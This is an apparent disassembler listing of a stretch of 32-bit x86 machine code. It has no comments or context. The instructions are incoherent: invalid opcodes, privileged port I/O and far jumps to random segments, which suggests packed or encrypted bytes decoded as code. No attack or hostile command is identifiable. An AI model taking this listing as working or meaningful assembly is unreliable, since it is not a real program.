  414e6b:	pop    ss
  414e6c:	inc    edi
  414e6d:	aad    0x43
  414e6f:	dec    esi
  414e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e71:	aam    0xea
  414e73:	sub    DWORD PTR [edx-0x2b],ebx
  414e76:	jp     0x414e86
  414e78:	xchg   ebp,eax
  414e79:	add    DWORD PTR [ecx],0x96e1fdbe
  414e7f:	lods   eax,DWORD PTR ds:[esi]
  414e80:	jmp    0x3e8775eb
  414e85:	retf   
  414e86:	xchg   BYTE PTR [edi+eiz*2],dl
  414e89:	sar    cl,cl
  414e8b:	in     eax,0xb
  414e8d:	out    dx,al
  414e8e:	pop    es
  414e8f:	pop    ebp
  414e90:	and    esi,0x27de4580
  414e96:	xchg   ebx,eax
  414e97:	out    dx,eax
  414e98:	lods   eax,DWORD PTR ds:[esi]
  414e99:	jl     0x414ec9
  414e9b:	loopne 0x414ebd
  414e9d:	stos   DWORD PTR es:[edi],eax
  414e9e:	ss pushf 
  414ea0:	fisub  WORD PTR [ecx+edi*1+0x2b]
  414ea4:	cmc    
  414ea5:	mov    al,ds:0xd63c17bd
  414eaa:	sahf   
  414eab:	jmp    0x414ec1
  414ead:	sbb    DWORD PTR [ecx+0x42],esi
  414eb0:	ins    DWORD PTR es:[edi],dx
  414eb1:	jge    0x414e48
  414eb3:	pop    edx
  414eb4:	xor    BYTE PTR ds:0x7622dc24,cl
  414eba:	int    0x79
  414ebc:	leave  
  414ebd:	aad    0x8
  414ebf:	jo     0x414ec9
  414ec1:	hlt    
  414ec2:	add    ebp,DWORD PTR [esi-0x54c60bad]
  414ec8:	iret   
  414ec9:	stos   BYTE PTR es:[edi],al
  414eca:	fistp  DWORD PTR [edi+0x333b90b5]
  414ed0:	cmc    
  414ed1:	and    edi,DWORD PTR [esi-0x2fefe635]
  414ed7:	and    DWORD PTR [ebp-0xe037783],edx
  414edd:	imul   edx
  414edf:	repnz jmp FWORD PTR [edx]
  414ee2:	sub    DWORD PTR [eax-0x21f86d8d],eax
  414ee8:	in     eax,0x8d
  414eea:	gs in  al,dx
  414eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eed:	sar    BYTE PTR [esi],1
  414eef:	sub    DWORD PTR [edx],ecx
  414ef1:	xchg   esi,eax
  414ef2:	fadd   QWORD PTR [edx+ebx*1]
  414ef5:	outs   dx,DWORD PTR ds:[esi]
  414ef6:	push   ebp
  414ef7:	loopne 0x414f11
  414ef9:	ret    0xc68
  414efc:	addr16 xchg esp,eax
  414efe:	and    BYTE PTR [esi-0x17],bh
  414f01:	loope  0x414eb4
  414f03:	jb     0x414f7d
  414f05:	sbb    DWORD PTR [edx+0x43],0xffffffd2
  414f09:	or     DWORD PTR [esi+edx*2+0x206e4696],esi
  414f10:	xchg   ebp,eax
  414f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f12:	mov    edi,0xaab600a
  414f17:	pop    ss
  414f18:	cwde   
  414f19:	fild   QWORD PTR [ecx]
  414f1b:	adc    BYTE PTR [esi+0x526d0f66],dh
  414f21:	repnz or BYTE PTR [ebp+0x47205d6b],ch
  414f28:	mov    cl,0x3
  414f2a:	cli    
  414f2b:	xchg   ebp,eax
  414f2c:	cmp    eax,0x2b1e4f00
  414f31:	test   eax,0x180fdf37
  414f36:	out    dx,eax
  414f37:	fstp   TBYTE PTR [eax+0x57]
  414f3a:	mov    eax,0xef945c37
  414f3f:	cmc    
  414f40:	sub    ch,al
  414f42:	and    ebx,DWORD PTR [eax-0x76bed69f]
  414f48:	sti    
  414f49:	jb     0x414fb5
  414f4b:	or     DWORD PTR [esi],esp
  414f4d:	(bad)  
  414f4f:	in     eax,dx
  414f50:	mov    ebp,0x15c69543
  414f55:	xchg   esi,eax
  414f56:	push   es
  414f57:	lea    edx,[eax+0x1046cc8f]
  414f5d:	retf   0xf2de
  414f60:	jecxz  0x414f4a
  414f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f63:	mov    ds:0xff9f31d2,al
  414f68:	popa   
  414f69:	lods   al,BYTE PTR ds:[esi]
  414f6a:	add    al,0x9c
  414f6c:	clc    
  414f6d:	add    ch,BYTE PTR [edx+edi*1]
  414f70:	xchg   esi,eax
  414f71:	pop    ss
  414f72:	pop    esp
  414f73:	arpl   WORD PTR [esp+esi*2+0x78],sp
  414f77:	out    dx,al
  414f78:	adc    eax,DWORD PTR [eax]
  414f7a:	mov    ch,0xd5
  414f7c:	pop    es
  414f7d:	dec    edx
  414f7e:	out    dx,eax
  414f7f:	pop    ss
  414f80:	ret    
  414f81:	aam    0xc7
  414f83:	and    bl,BYTE PTR [edx-0x530306a7]
  414f89:	and    dh,BYTE PTR [ecx]
  414f8b:	pop    ss
  414f8c:	ins    DWORD PTR es:[edi],dx
  414f8d:	in     al,dx
  414f8e:	cmp    ebx,DWORD PTR [ebx]
  414f90:	add    DWORD PTR [edx-0x1c635779],edi
  414f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f97:	xchg   BYTE PTR [edi-0x66],ch
  414f9a:	jge    0x414f63
  414f9c:	(bad)  [esi]
  414f9e:	stos   DWORD PTR es:[edi],eax
  414f9f:	rcr    DWORD PTR [ebx-0x5a68e281],cl
  414fa5:	and    BYTE PTR [edi+0x36],dl
  414fa8:	je     0x414f7b
  414faa:	fcmovne st,st(3)
  414fac:	xchg   eax,edi
  414fae:	xor    ah,BYTE PTR [esi+0x20]
  414fb1:	sub    DWORD PTR [ecx+0x5995db12],ecx
  414fb7:	ins    DWORD PTR es:[edi],dx
  414fb8:	jnp    0x414ffe
  414fba:	dec    edi
  414fbb:	sbb    DWORD PTR [edi+esi*2+0x4b],esi
  414fbf:	leave  
  414fc0:	(bad)  
  414fc1:	clc    
  414fc2:	popa   
  414fc3:	jbe    0x414fa1
  414fc5:	add    DWORD PTR [eax-0x1b63ab97],eax
  414fcb:	pop    ecx
  414fcc:	add    eax,0x8416286f
  414fd1:	neg    BYTE PTR [edi]
  414fd3:	pop    esp
  414fd4:	outs   dx,BYTE PTR ds:[esi]
  414fd5:	inc    ebp
  414fd6:	jne    0x414fa1
  414fd8:	addr16 push ds
  414fda:	call   0xc4e20bd1
  414fdf:	call   0xc558:0x985b8afa
  414fe6:	sbb    ebx,DWORD PTR [ebp+0x3af0cc95]
  414fec:	add    eax,0x68a2a9c6
  414ff1:	cmp    al,0xce
  414ff3:	add    edx,DWORD PTR [ebp-0x62]
  414ff6:	sub    ah,BYTE PTR ds:0x152bdd7c
  414ffc:	or     bl,BYTE PTR [ebp-0x8]
  414fff:	loopne 0x415051
  415001:	shr    BYTE PTR [ebx],1
  415003:	push   ecx
  415004:	cmp    ecx,edx
  415006:	pop    fs
  415008:	push   esi
  415009:	mov    ebx,0x3b1a819e
  41500e:	mov    ds:0xbb4e22a2,al
  415013:	xchg   edi,eax
  415014:	out    dx,al
  415015:	arpl   dx,dx
  415017:	popa   
  415018:	packuswb mm4,QWORD PTR [eax-0x58bc5a2b]
  41501f:	mov    ds:0xa33e4df5,eax
  415024:	push   esi
  415025:	jne    0x41501e
  415027:	jecxz  0x415067
  415029:	out    0x3b,eax
  41502b:	mov    ecx,0x20eb4c4
  415030:	mov    al,0x88
  415032:	jmp    0x414fd0
  415034:	(bad)  [edx+0x59b98a71]
  41503a:	jmp    0x56c7:0xefec8078
  415041:	push   eax
  415042:	or     DWORD PTR [edx+0x44],ecx
  415045:	and    BYTE PTR [ebp-0x29307fb4],bh
  41504b:	mov    al,ds:0x67b5143d
  415050:	mov    ds:0xa5f453a7,al
  415055:	test   eax,0x1b9a3425
  41505a:	stc    
  41505b:	add    edx,DWORD PTR [ebx]
  41505d:	jnp    0x415029
  41505f:	or     edi,DWORD PTR [esi+0x26badcc2]
  415065:	aas    
  415066:	mov    ?,WORD PTR [ebx+esi*2+0x49]
  41506a:	xchg   edi,eax
  41506b:	inc    eax
  41506c:	scas   al,BYTE PTR es:[edi]
  41506d:	sbb    eax,0x696bd8b7
  415072:	add    DWORD PTR [esp+ecx*1-0x50],ecx
  415076:	add    eax,0xf2d60573
  41507b:	ficom  DWORD PTR [ecx]
  41507d:	push   cs
  41507e:	mov    dl,bh
  415080:	fbld   TBYTE PTR [ebx+0x4d]
  415083:	loopne 0x4150dc
  415085:	lds    ebp,FWORD PTR [esi+edi*2-0x57]
  415089:	fistp  QWORD PTR [edx+eax*8-0x5a]
  41508d:	dec    ecx
  41508e:	imul   eax,DWORD PTR [esi],0xd564c730
  415094:	in     al,0x50
  415096:	not    dl
  415098:	xor    al,0x2a
  41509a:	outs   dx,BYTE PTR ds:[esi]
  41509b:	iret   
  41509c:	daa    
  41509d:	xor    dh,dl
  41509f:	mov    bl,al
  4150a1:	push   ecx
  4150a2:	add    eax,0xc155f877
  4150a7:	fcomp  DWORD PTR [edx+0x42f877c0]
  4150ad:	push   ebp
  4150ae:	sub    al,0x8
  4150b0:	cmp    eax,DWORD PTR [esi-0x5b]
  4150b3:	mov    ebp,0x6e6d8fa3
  4150b8:	sub    ebp,DWORD PTR [edi+0x52]
  4150bb:	jp     0x415092
  4150bd:	test   esp,esi
  4150bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150c0:	js     0x415050
  4150c2:	push   esp
  4150c3:	inc    ecx
  4150c4:	fist   DWORD PTR [esi-0x7b]
  4150c7:	jg     0x415087
  4150c9:	mov    WORD PTR [ebx-0x1a],ds
  4150cc:	sub    al,0x72
  4150ce:	aam    0x2d
  4150d0:	or     BYTE PTR [ebp-0x1476c61f],al
  4150d6:	inc    ebp
  4150d7:	retf   0x5041
  4150da:	idiv   dl
  4150dc:	xor    eax,0x52f9ef5b
  4150e1:	cmp    al,0x24
  4150e3:	mov    WORD PTR [ebx-0x5acc89b4],gs
  4150e9:	nop
  4150ea:	push   ds
  4150eb:	call   0x5f8b:0xd43014f2
  4150f2:	retf   
  4150f3:	push   ebx
  4150f4:	loopne 0x4150d6
  4150f6:	sub    al,0x53
  4150f8:	jecxz  0x415152
  4150fa:	cmp    DWORD PTR [ebx-0x5757f31f],0x3fd539bf
  415104:	push   edx
  415105:	pop    es
  415106:	mov    edx,0x304a07b8
  41510b:	xchg   ebp,eax
  41510c:	mov    eax,ds:0xfc8a16de
  415111:	jmp    0x993c:0x235f9575
  415118:	int3   
  415119:	stos   DWORD PTR es:[edi],eax
  41511a:	es mov eax,ss
  41511d:	mov    bl,0x9c
  41511f:	ja     0x4150fe
  415121:	push   esi
  415122:	in     al,dx
  415123:	ja     0x415177
  415125:	adc    DWORD PTR [ebx],edx
  415127:	or     DWORD PTR [ebx-0x326bbcf9],eax
  41512d:	data16 jae 0x4150b9
  415130:	jns    0x4150cf
  415132:	or     DWORD PTR [edx],esi
  415134:	(bad)  
  415135:	mov    ch,0x3d
  415137:	(bad)  
  415138:	mov    al,ds:0x62937cde
  41513d:	push   ebp
  41513e:	sbb    eax,0x386589f2
  415143:	xchg   esi,eax
  415144:	adc    eax,0x59d04ca9
  415149:	test   al,0x46
  41514b:	pop    ebp
  41514c:	retf   
  41514d:	xor    ebp,DWORD PTR [ecx+0x3cdf66af]
  415153:	and    BYTE PTR [esi-0xb],bl
  415156:	call   0xd467811a
  41515b:	jae    0x41519a
  41515d:	pop    esp
  41515e:	push   ss
  41515f:	mov    esp,0xb6fecb5c
  415164:	ror    BYTE PTR [ebp-0x23],0xb9
  415168:	jae    0x415190
  41516a:	push   cs
  41516b:	sbb    eax,0xabe71bb4
  415170:	cmp    ch,BYTE PTR [edi-0x3818fccf]
  415176:	adc    BYTE PTR [ebx],0x71
  415179:	mov    bh,0x7f
  41517b:	mov    edi,0x6a9cb4d9
  415180:	mov    al,ds:0x8f78c774
  415185:	mov    WORD PTR ds:0x35d63ec6,es
  41518b:	cmc    
  41518c:	(bad)  [ebx-0x33]
  41518f:	lahf   
  415190:	(bad)  
  415191:	mov    ch,0x94
  415193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415194:	push   ecx
  415195:	outs   dx,BYTE PTR ds:[esi]
  415196:	neg    DWORD PTR [eax-0x4fa74270]
  41519c:	or     edx,DWORD PTR [esi]
  41519e:	(bad)  
  41519f:	push   eax
  4151a0:	inc    eax
  4151a1:	scas   al,BYTE PTR es:[edi]
  4151a2:	stc    
  4151a3:	push   ebp
  4151a4:	push   ebp
  4151a5:	scas   eax,DWORD PTR es:[edi]
  4151a6:	jb     0x415165
  4151a8:	(bad)  
  4151a9:	mov    dl,0x32
  4151ab:	cdq    
  4151ac:	pop    ebx
  4151ad:	xor    bh,dl
  4151af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151b0:	mov    ch,0xe1
  4151b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151b3:	pop    ebp
  4151b4:	ja     0x4151f0
  4151b6:	out    0x3b,al
  4151b8:	xchg   edx,eax
  4151b9:	loopne 0x4151e4
  4151bb:	pop    ebx
  4151bc:	std    
  4151bd:	push   esi
  4151be:	out    0xdf,eax
  4151c0:	mov    ecx,0xbcc77764
  4151c5:	push   0x31c2161a
  4151ca:	aas    
  4151cb:	ror    DWORD PTR [ebx-0x65],0xe3
  4151cf:	jmp    0x4151be
  4151d1:	in     al,0x9d
  4151d3:	in     eax,0x9a
  4151d5:	mov    dl,0x1c
  4151d7:	rcr    DWORD PTR [edi+0x67],0x4a
  4151db:	mov    eax,ds:0xef84f479
  4151e0:	xlat   BYTE PTR ds:[ebx]
  4151e1:	mov    eax,0x3d0d9fc1
  4151e6:	retf   
  4151e7:	mov    bl,al
  4151e9:	inc    ecx
  4151ea:	push   ebp
  4151eb:	jge    0x4151a6
  4151ed:	mov    ebp,0x686cfb13
  4151f2:	cmp    al,0x96
  4151f4:	inc    ebx
  4151f5:	push   ecx
  4151f6:	sbb    DWORD PTR [edx],edi
  4151f8:	jae    0x415210
  4151fa:	adc    DWORD PTR [ebp+eax*1-0x51],ebx
  4151fe:	(bad)
  415202:	iret   
  415203:	ins    DWORD PTR es:[edi],dx
  415204:	mov    ds:0x34d0ed3,al
  415209:	out    0x27,eax
  41520b:	inc    esi
  41520c:	fdivrp st(6),st
  41520e:	pushf  
  41520f:	push   0xc26e68d
  415214:	xchg   esp,eax
  415215:	pop    esp
  415216:	inc    eax
  415217:	cmp    ah,BYTE PTR [esi+ecx*2]
  41521a:	gs cld 
  41521c:	les    esi,FWORD PTR [edx]
  41521e:	hlt    
  41521f:	ret    0x707
  415222:	stos   DWORD PTR es:[edi],eax
  415223:	mov    edi,0xb454daae
  415228:	jg     0x4151fb
  41522a:	rcl    BYTE PTR [eax],cl
  41522c:	pop    ss
  41522d:	aaa    
  41522e:	add    al,0x99
  415230:	lock sbb esi,DWORD PTR [ecx]
  415233:	or     DWORD PTR [eax+0x42],esp
  415236:	lahf   
  415237:	lock xchg edx,eax
  415239:	dec    edi
  41523a:	sbb    al,0x81
  41523c:	xchg   esp,eax
  41523d:	cmp    eax,0xc9794096
  415242:	mov    edi,0x2731c197
  415247:	stc    
  415248:	jnp    0x415238
  41524a:	std    
  41524b:	loop   0x415298
  41524d:	ins    DWORD PTR es:[edi],dx
  41524e:	mov    ah,0xb2
  415250:	mov    cl,0xb9
  415252:	in     al,dx
  415253:	or     ecx,ecx
  415255:	fisttp DWORD PTR [ebx+0x8]
  415258:	ret    0x262
  41525b:	scas   al,BYTE PTR es:[edi]
  41525c:	lds    ecx,FWORD PTR [ebx+0x49b56eba]
  415262:	dec    ecx
  415263:	test   eax,0x72537045
  415268:	jb     0x415226
  41526a:	in     eax,0xee
  41526c:	dec    eax
  41526d:	jbe    0x4152a9
  41526f:	ss iret 
  415271:	shl    DWORD PTR [ebp+esi*2+0x1393deec],0x94
  415279:	or     al,BYTE PTR [eax-0x297585a6]
  41527f:	jne    0x4152cc
  415281:	retf   
  415282:	and    BYTE PTR [ecx],0xf9
  415285:	cwde   
  415286:	int    0x71
  415288:	scas   eax,DWORD PTR es:[edi]
  415289:	jp     0x41530a
  41528b:	adc    BYTE PTR [edi-0xda95d0f],cl
  415291:	mov    eax,0x8ff85cf4
  415296:	call   0x26d2281a
  41529b:	xchg   ebp,eax
  41529c:	sbb    BYTE PTR [edx-0x42],al
  41529f:	mov    ch,0x82
  4152a1:	aam    0xfb
  4152a3:	push   ds
  4152a4:	retf   0x24db
  4152a7:	(bad)  
  4152a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152a9:	or     ch,cl
  4152ab:	inc    ebp
  4152ac:	and    eax,0xd1916c24
  4152b1:	call   0x39bb:0xf0c31948
  4152b8:	ror    BYTE PTR [esi+0x4b],cl
  4152bb:	iret   
  4152bc:	sbb    BYTE PTR [esi-0x31],0xfa
  4152c0:	(bad)  
  4152c1:	enter  0xdf7f,0x55
  4152c5:	inc    bl
  4152c7:	aam    0x4d
  4152c9:	xchg   esi,eax
  4152ca:	and    al,0xc6
  4152cc:	sbb    edx,DWORD PTR [ebx+ecx*8+0x6757a269]
  4152d3:	jbe    0x415318
  4152d5:	mov    esi,0xddd538e
  4152da:	mov    edx,0x86361929
  4152df:	hlt    
  4152e0:	or     eax,0xc80a2f1e
  4152e5:	lahf   
  4152e6:	add    BYTE PTR [di+0x361d],ah
  4152eb:	stos   BYTE PTR es:[edi],al
  4152ec:	pop    ebp
  4152ed:	(bad)  
  4152ef:	(bad)  
  4152f0:	jp     0x4152b7
  4152f2:	addr16 mov cl,0xbc
  4152f5:	neg    BYTE PTR [ecx+0x518b6d99]
  4152fb:	xchg   edi,eax
  4152fc:	aaa    
  4152fd:	push   ds
  4152fe:	pop    ebp
  4152ff:	shr    BYTE PTR [eax-0x6571b2d0],0x9e
  415306:	jmp    0xa1f3ecd5
  41530b:	inc    ebx
  41530c:	retf   0xe14a
  41530f:	dec    ebx
  415310:	jb     0x41531c
  415312:	mov    eax,ds:0x292ab4d9
  415317:	sbb    ch,ah
  415319:	dec    esp
  41531a:	cmc    
  41531b:	cs inc esi
  41531d:	(bad)  
  41531e:	xchg   esi,eax
  41531f:	cwde   
  415320:	mov    edx,0x8807392
  415325:	push   esp
  415326:	or     eax,0xa9c4ef3b
  41532b:	inc    ecx
  41532c:	jl     0x4152ee
  41532e:	inc    esi
  41532f:	dec    ebp
  415330:	mov    ecx,0x507cf3a0
  415335:	pop    ebp
  415336:	int3   
  415337:	and    DWORD PTR [ebx+0x7d],edx
  41533a:	outs   dx,BYTE PTR ds:[esi]
  41533b:	sbb    eax,DWORD PTR [ecx+0x12]
  41533e:	sub    DWORD PTR [esi+0x14],ebx
  415341:	in     al,dx
  415342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415343:	mov    al,ds:0x69166fae
  415348:	mov    eax,0xeaf886ac
  41534d:	sub    eax,0xead6322b
  415352:	mov    dh,0x7f
  415354:	adc    eax,DWORD PTR [ebx+0xd636b1d]
  41535a:	inc    edi
  41535b:	fwait
  41535c:	in     al,dx
  41535d:	pusha  
  41535e:	mov    ds:0x6b1a4a77,ax
  415364:	les    esp,FWORD PTR [esi+eiz*1-0x9]
  415368:	and    eax,0x93aee1fd
  41536d:	or     esp,edi
  41536f:	jle    0x4153cd
  415371:	xchg   esp,eax
  415372:	or     al,0xc7
  415374:	outs   dx,BYTE PTR ds:[esi]
  415375:	adc    ecx,DWORD PTR [eax-0x3c]
  415378:	cmp    eax,0x6517ad8e
  41537d:	daa    
  41537e:	xchg   esp,eax
  41537f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415381:	mov    eax,ds:0xa01a3517
  415386:	mov    bh,0x8
  415388:	mov    al,ds:0x4256338f
  41538d:	rcr    BYTE PTR [eax+0x275ec8f8],cl
  415393:	push   ss
  415394:	mov    dl,0x19
  415396:	arpl   WORD PTR [edx],si
  415398:	adc    BYTE PTR [ebx+0x1c],ah
  41539b:	sub    BYTE PTR [ebp+0x20e63fd2],dl
  4153a1:	sub    al,0x20
  4153a3:	add    DWORD PTR ds:0x31757060,edx
  4153a9:	inc    ecx
  4153aa:	mov    esi,DWORD PTR [ebx+0x10fd773]
  4153b0:	mov    eax,ebp
  4153b2:	cmp    ch,ah
  4153b4:	sub    BYTE PTR [edx],0xd4
  4153b7:	inc    eax
  4153b8:	enter  0x98d4,0x67
  4153bc:	mov    edx,DWORD PTR [ecx+esi*1]
  4153bf:	sbb    DWORD PTR [ebx-0xb],edi
  4153c2:	(bad)  
  4153c3:	dec    ebp
  4153c4:	packuswb mm5,mm1
  4153c7:	jle    0x4153c2
  4153c9:	addr16 or bl,bh
  4153cc:	pop    ebx
  4153cd:	test   DWORD PTR [eax+0x4a5ecca],edx
  4153d3:	adc    DWORD PTR [ebp-0x73],0x5a
  4153d7:	jo     0x41540d
  4153d9:	sbb    DWORD PTR [edi+0x62],esi
  4153dc:	ins    DWORD PTR es:[edi],dx
  4153dd:	mov    ch,ch
  4153df:	jnp    0x4153c0
  4153e1:	add    bl,dh
  4153e3:	pop    esp
  4153e4:	ret    
  4153e5:	or     DWORD PTR [esi+0x704f2e85],esi
  4153eb:	fmul   QWORD PTR [esi+0x3117c23f]
  4153f1:	(bad)  
  4153f3:	mov    eax,ds:0x31430923
  4153f8:	aam    0x54
  4153fa:	or     esi,ecx
  4153fc:	test   eax,0xab40e75c
  415401:	fstp   DWORD PTR [edi]
  415403:	sbb    esp,DWORD PTR [ecx-0x1745081c]
  415409:	shl    BYTE PTR [edx-0x70],cl
  41540c:	pop    esi
  41540d:	cmp    ebp,DWORD PTR [edx]
  41540f:	int3   
  415410:	cwde   
  415411:	push   es
  415412:	lahf   
  415413:	sti    
  415414:	bound  esi,QWORD PTR [esi]
  415416:	push   esi
  415417:	and    DWORD PTR [ebp+0x40],eax
  41541a:	adc    ebp,DWORD PTR [ecx]
  41541c:	cmp    bl,dh
  41541e:	xor    BYTE PTR [edi+0x1ae1e11],cl
  415424:	aad    0x70
  415426:	and    DWORD PTR [esi+0x31016278],esp
  41542c:	mov    ecx,DWORD PTR [esi+edx*1]
  41542f:	lea    edx,[esi+0x9]
  415432:	out    dx,eax
  415433:	(bad)  
  415434:	xchg   edx,eax
  415435:	xchg   ebx,eax
  415436:	dec    ebp
  415437:	mov    al,bh
  415439:	pushf  
  41543a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41543b:	idiv   ch
  41543d:	sbb    esp,eax
  41543f:	shl    DWORD PTR [eax],0x65
  415442:	sbb    BYTE PTR [edi+0x522589d7],cl
  415448:	and    edx,DWORD PTR [esi+0x1]
  41544b:	pop    eax
  41544c:	xchg   DWORD PTR [ecx-0x5f],edx
  41544f:	add    esp,esi
  415451:	mov    esi,0x9ee21e3b
  415456:	call   0xdf7b9e0f
  41545b:	sub    DWORD PTR [ebx+eiz*8-0x15c97b6f],eax
  415462:	ds ins BYTE PTR es:[edi],dx
  415464:	imul   ecx,DWORD PTR [eax+0x7399045e],0xffffff8a
  41546b:	push   0x18b33ed1
  415470:	arpl   WORD PTR [edi+0x399278ac],dx
  415476:	setg   BYTE PTR [eax-0x560817bd]
  41547d:	cmp    dl,al
  41547f:	stos   BYTE PTR es:[edi],al
  415480:	loope  0x4154f7
  415482:	pop    ss
  415483:	sbb    eax,0x1dc3f0f7
  415488:	mov    ebp,0xdb9176d
  41548d:	add    al,BYTE PTR [ebp-0x55]
  415490:	xlat   BYTE PTR ds:[ebx]
  415491:	or     al,0x5c
  415493:	shr    cl,1
  415495:	stos   DWORD PTR es:[edi],eax
  415496:	into   
  415497:	cmp    BYTE PTR [ebx+ebx*4-0x65],dl
  41549b:	xchg   BYTE PTR [esi-0x5],al
  41549e:	jne    0x415438
  4154a0:	fiadd  DWORD PTR [ebp-0x79]
  4154a3:	pop    edi
  4154a4:	rcl    ebp,0xdf
  4154a7:	ret    0x771b
  4154aa:	(bad)  
  4154ac:	sub    ch,BYTE PTR [edx]
  4154ae:	arpl   WORD PTR [edi-0x52],sp
  4154b1:	fucomip st,st(4)
  4154b3:	lea    ecx,[ecx-0x1d]
  4154b6:	dec    ebp
  4154b7:	inc    ebx
  4154b8:	xchg   ecx,eax
  4154b9:	or     dh,bl
  4154bb:	pop    eax
  4154bc:	dec    eax
  4154be:	xchg   ebp,eax
  4154bf:	push   edi
  4154c0:	das    
  4154c1:	icebp  
  4154c2:	adc    DWORD PTR [ebx],esi
  4154c4:	mov    eax,ds:0x2f2fb120
  4154c9:	js     0x415485
  4154cb:	stos   DWORD PTR es:[edi],eax
  4154cc:	sbb    esi,DWORD PTR [eax+0x23]
  4154cf:	jl     0x4154aa
  4154d1:	dec    edx
  4154d2:	mov    dl,0x69
  4154d4:	leave  
  4154d5:	sbb    eax,0x4eb4206d
  4154da:	out    0xd7,al
  4154dc:	cmp    ebx,eax
  4154de:	aaa    
  4154df:	cmp    BYTE PTR [edx],0xb9
  4154e2:	(bad)  
  4154e3:	sbb    BYTE PTR [edx-0x64],bh
  4154e6:	xchg   ebx,eax
  4154e7:	sub    esi,esp
  4154e9:	push   edi
  4154ea:	and    DWORD PTR [eax-0x4ecd176d],edi
  4154f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154f1:	outs   dx,BYTE PTR ds:[esi]
  4154f2:	cmp    al,0x66
  4154f4:	jp     0x4154c5
  4154f6:	xchg   edi,eax
  4154f7:	cmp    BYTE PTR [edx+0x666da237],bl
  4154fd:	cmp    ebx,DWORD PTR [edx-0x31fc97dd]
  415503:	and    al,0x2b
  415505:	cmpxchg BYTE PTR [ebx+0x52],dh
  415509:	lods   eax,DWORD PTR ds:[esi]
  41550a:	addr16 cmp ch,0xb
  41550e:	sti    
  41550f:	sbb    DWORD PTR [edx],edx
  415511:	fwait
  415512:	das    
  415513:	push   ecx
  415514:	fdiv   QWORD PTR [edx]
  415516:	jge    0x415522
  415518:	outs   dx,BYTE PTR ds:[esi]
  415519:	inc    esi
  41551a:	retf   
  41551b:	loopne 0x415593
  41551d:	sbb    al,0x6f
  41551f:	jg     0x4154ec
  415521:	(bad)  
  415522:	push   edi
  415523:	gs aas 
  415525:	sbb    BYTE PTR [ecx],bh
  415527:	aaa    
  415528:	outs   dx,DWORD PTR ds:[esi]
  415529:	jbe    0x4154d8
  41552b:	call   0xd26cc586
  415530:	sbb    ecx,DWORD PTR ss:[edx-0x1eb324cc]
  415537:	xchg   ebx,eax
  415538:	mov    ds,WORD PTR [eax]
  41553a:	pop    ebp
  41553b:	mov    ds:0xf541286a,al
  415540:	xor    BYTE PTR [esi],0x32
  415543:	fcom   QWORD PTR [ebx+0x6555ce3]
  415549:	cmp    al,al
  41554b:	or     al,0xeb
  41554d:	(bad)  
  41554f:	and    bl,bh
  415551:	xchg   BYTE PTR [esi-0x277674e6],ch
  415557:	(bad)  
  415558:	arpl   WORD PTR [ecx-0x6],bx
  41555b:	or     edx,DWORD PTR [eax-0x2395cf69]
  415561:	aad    0x92
  415563:	popa   
  415564:	mov    ss,esp
  415566:	out    0x37,eax
  415568:	das    
  415569:	and    eax,0x9aff38e3
  41556e:	lods   al,BYTE PTR ds:[esi]
  41556f:	and    eax,0xa20eaa08
  415574:	jo     0x4155ae
  415576:	mov    dl,0xca
  415578:	inc    ecx
  415579:	out    0xcc,eax
  41557b:	and    eax,0xc0aea7f7
  415580:	cmp    cl,bh
  415582:	mov    ds:0x259ae4e0,al
  415587:	fwait
  415588:	inc    esi
  415589:	outs   dx,BYTE PTR ds:[esi]
  41558a:	mov    al,0xa
  41558c:	cmp    BYTE PTR [ebx],ch
  41558e:	cwde   
  41558f:	add    ecx,DWORD PTR [eax+ebp*8]
  415592:	clc    
  415593:	push   0x830329be
  415598:	fxch   st(0)
  41559a:	mov    al,0x3b
  41559c:	pop    esi
  41559d:	es pop ecx
  41559f:	sbb    BYTE PTR [edx],al
  4155a1:	adc    DWORD PTR [esp+edi*8-0x50],0x9944d44
  4155a9:	and    DWORD PTR [ebx-0x558fe859],eax
  4155af:	pop    ebp
  4155b0:	pop    ebp
  4155b1:	sub    DWORD PTR [edi],edi
  4155b3:	jmp    0x415575
  4155b5:	jnp    0x4155f8
  4155b7:	mov    esi,0xb47dfad4
  4155bc:	dec    edi
  4155bd:	into   
  4155be:	dec    edi
  4155bf:	jmp    DWORD PTR [edx]
  4155c1:	adc    ch,al
  4155c3:	aad    0x5e
  4155c5:	sbb    BYTE PTR ds:0xa89dcc1d,dl
  4155cb:	dec    ebx
  4155cc:	add    ebx,DWORD PTR [edi+0x252b5d5e]
  4155d2:	call   0x2b83:0xc16b6772
  4155d9:	arpl   WORD PTR [ebx],cx
  4155db:	ja     0x4155d1
  4155dd:	lahf   
  4155de:	fs int 0x1b
  4155e1:	fxch   st(0)
  4155e3:	dec    ecx
  4155e4:	ins    DWORD PTR es:[edi],dx
  4155e5:	mov    dh,0xfd
  4155e7:	pop    esi
  4155e8:	test   al,0x9b
  4155ea:	push   0x50943aa7
  4155ef:	les    edx,FWORD PTR [edi]
  4155f1:	into   
  4155f2:	xchg   ebp,eax
  4155f3:	push   eax
  4155f4:	dec    ecx
  4155f5:	or     ecx,DWORD PTR [esi+eiz*4+0x3a]
  4155f9:	add    al,BYTE PTR [edi-0x11068a37]
  4155ff:	jnp    0x41560b
  415601:	pop    ds
  415602:	adc    DWORD PTR [eax-0x7],0x55
  415606:	jnp    0x415606
  415608:	mul    DWORD PTR [eax-0x72a5a4]
  41560e:	push   ss
  41560f:	pop    esi
  415610:	(bad)  
  415611:	mov    ch,0x42
  415613:	inc    edi
  415614:	inc    sp
  415616:	jle    0x4155ce
  415618:	addr16 dec edx
  41561a:	popf   
  41561b:	mov    dl,bl
  41561d:	inc    ebp
  41561e:	hlt    
  41561f:	xor    eax,0xcacf6a15
  415624:	dec    ebx
